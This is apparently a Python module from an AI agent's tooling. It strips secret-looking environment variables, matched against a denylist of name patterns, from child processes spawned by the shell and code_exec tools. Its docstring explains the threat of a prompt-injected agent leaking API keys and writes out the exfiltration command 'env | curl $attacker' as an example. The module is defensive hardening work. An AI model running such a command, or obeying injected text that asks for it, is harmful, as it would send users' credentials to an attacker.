"""Subprocess environment hygiene for the shell + code_exec tools.

Per the 2026-06 security hardening pass: child processes spawned by the
shell and code_exec tools previously inherited the parent's *entire*
environment, including ``ANTHROPIC_API_KEY``, ``OPENROUTER_API_KEY``,
peer bearer tokens, and any cloud credentials present at launch. Because
the agent executes model-generated commands and code, a single
prompt-injected ``env | curl $attacker`` (or equivalent in Python) would
exfiltrate every secret in one shot.

Design choice — *denylist by name pattern*, not an allowlist. The agent's
whole job depends on a working toolchain (``uv run pytest``, ``git
commit``, ``ruff`` …), and those tools read a wide, hard-to-enumerate set
of operational env vars (``HOME``, ``PATH``, ``GIT_*``, ``UV_*``,
``LANG``/``LC_*``, ``VIRTUAL_ENV``, ``CHIMERA_*`` …). A tight allowlist
would silently break legitimate work. The stated threat is *secret*
exfiltration, so we strip variables whose **name** matches a secret
pattern and pass everything else through unchanged.

This is name-based and therefore not a complete data-flow control: a
secret deliberately stashed under an innocuous name would survive. It
closes the realistic, high-impact case (well-known API-key/token env
vars) without breaking the toolchain. Network-level egress isolation
(tracked separately for code_exec) is the defence for the residual case.
"""

from __future__ import annotations

import os
import re

# Substrings that mark an env var name as carrying a secret. Matched
# case-insensitively against the variable NAME. Kept broad on purpose —
# false positives (a non-secret var that happens to contain "TOKEN")
# being dropped from a child process is far cheaper than a real key
# leaking. Operational toolchain vars (PATH/HOME/GIT_*/UV_*/LANG…) do not
# match any of these and pass through.
_SECRET_NAME_PATTERNS: tuple[str, ...] = (
    "API_KEY",
    "APIKEY",
    "ACCESS_KEY",
    "SECRET",
    "TOKEN",
    "PASSWORD",
    "PASSWD",
    "PASSPHRASE",
    "CREDENTIAL",
    "PRIVATE_KEY",
    "SESSION_KEY",
    # NB: bare "AUTH" is deliberately NOT a pattern — it matches GIT_AUTHOR_*
    # which git needs. Auth secrets in practice carry TOKEN/KEY/SECRET above.
    # Provider-branded keys that may not contain a generic marker above.
    "ANTHROPIC",
    "OPENROUTER",
    "OPENAI",
    "HUGGINGFACE",
    "EXA_API",
    "TAVILY",
    "BRAVE_",
)

# A handful of operational vars whose NAME matches a secret pattern but
# which are NOT secrets and which the toolchain needs.
_NAME_ALLOW_EXACT: frozenset[str] = frozenset()

_PATTERN_RE = re.compile("|".join(re.escape(p) for p in _SECRET_NAME_PATTERNS), re.IGNORECASE)


def is_secret_env_name(name: str) -> bool:
    """True when ``name`` looks like it holds a secret and should be stripped."""
    if name in _NAME_ALLOW_EXACT:
        return False
    return bool(_PATTERN_RE.search(name))


def sanitized_subprocess_env(base: dict[str, str] | None = None) -> dict[str, str]:
    """Return a copy of ``base`` (default ``os.environ``) with secret-looking
    variables removed, so secrets are never handed to a child process the
    agent controls.
    """
    source = os.environ if base is None else base
    return {k: v for k, v in source.items() if not is_secret_env_name(k)}
